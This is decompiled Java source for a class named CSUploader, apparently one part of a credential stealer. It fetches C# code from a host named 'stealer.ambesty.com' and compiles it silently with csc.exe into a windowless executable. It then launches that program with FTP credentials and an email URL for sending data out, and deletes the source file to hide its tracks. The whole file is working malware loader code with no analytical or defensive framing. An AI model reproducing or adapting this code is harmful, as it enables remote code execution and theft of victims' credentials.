import java.net.MalformedURLException;
import java.io.InputStream;
import java.io.DataInputStream;
import java.io.BufferedInputStream;
import java.net.URL;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.io.IOException;
import java.io.File;

// 
// Decompiled by Procyon v0.5.30
// 

public class CSUploader
{
    static String msnSourceDownload;
    static String storePathG;
    static String source;
    static String filePathG;
    static String fileNameG;
    static String emailURLG;
    static String serialG;
    static String locG;
    static String ftpUserG;
    static String ftpPassG;
    static String ftpPathG;
    
    static {
        CSUploader.msnSourceDownload = "http://stealer.ambesty.com/code/msn.aspx";
        CSUploader.storePathG = "";
        CSUploader.source = "";
        CSUploader.filePathG = "";
        CSUploader.fileNameG = "";
        CSUploader.emailURLG = "";
        CSUploader.serialG = "";
        CSUploader.locG = "";
        CSUploader.ftpUserG = "";
        CSUploader.ftpPassG = "";
        CSUploader.ftpPathG = "";
    }
    
    public static void start(final String storePath, final String filePath, final String fileName, final String emailURL, final String serial, final String loc, final String ftpUser, final String ftpPass, final String ftpPath) throws IOException {
        CSUploader.filePathG = filePath;
        CSUploader.fileNameG = fileName;
        CSUploader.emailURLG = emailURL;
        CSUploader.serialG = serial;
        CSUploader.locG = loc;
        CSUploader.ftpUserG = ftpUser;
        CSUploader.ftpPassG = ftpPass;
        CSUploader.ftpPathG = ftpPath;
        CSUploader.storePathG = storePath;
        download();
        copyFile();
        final File sourceCode = new File(String.valueOf(storePath) + "Client.cs");
        sourceCode.delete();
    }
    
    public static void copyFile() throws IOException {
        final PrintWriter out = new PrintWriter(String.valueOf(CSUploader.storePathG) + "Client.cs");
        out.write(CSUploader.source);
        out.close();
        runProgram();
    }
    
    public static void runProgram() {
        final String[] command = { "cmd /c dir" };
        try {
            final Runtime rt = Runtime.getRuntime();
            final Process pr = rt.exec("cmd /c C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\csc.exe /target:winexe /out:" + CSUploader.storePathG + "out.exe " + CSUploader.storePathG + "Client.cs");
            pr.waitFor();
            Thread.sleep(1000L);
            final Process pr2 = rt.exec("cmd /c start " + CSUploader.storePathG + "out " + CSUploader.filePathG + " " + CSUploader.fileNameG + " " + " " + CSUploader.emailURLG + " " + CSUploader.serialG + " " + CSUploader.locG + " " + CSUploader.ftpUserG + " " + CSUploader.ftpPassG + " " + CSUploader.ftpPathG);
            final BufferedReader input = new BufferedReader(new InputStreamReader(pr.getInputStream()));
            final String line = null;
            final int exitVal = pr.waitFor();
        }
        catch (Exception e) {
            System.out.println(e.toString());
            e.printStackTrace();
        }
    }
    
    public static void download() {
        InputStream is = null;
        try {
            CSUploader.msnSourceDownload = String.valueOf(CSUploader.msnSourceDownload) + "?serial=" + CSUploader.serialG;
            final URL u = new URL(CSUploader.msnSourceDownload);
            is = u.openStream();
            final DataInputStream dis = new DataInputStream(new BufferedInputStream(is));
            CSUploader.source = "";
            String s;
            while ((s = dis.readLine()) != null) {
                CSUploader.source = String.valueOf(CSUploader.source) + s;
            }
        }
        catch (MalformedURLException mue) {
            System.out.println("Ouch - a MalformedURLException happened.");
            mue.printStackTrace();
            System.exit(1);
        }
        catch (IOException ioe) {
            System.out.println("Oops- an IOException happened.");
            ioe.printStackTrace();
            System.exit(1);
        }
        finally {
            try {
                is.close();
            }
            catch (IOException ex) {}
        }
        try {
            is.close();
        }
        catch (IOException ex2) {}
    }
}
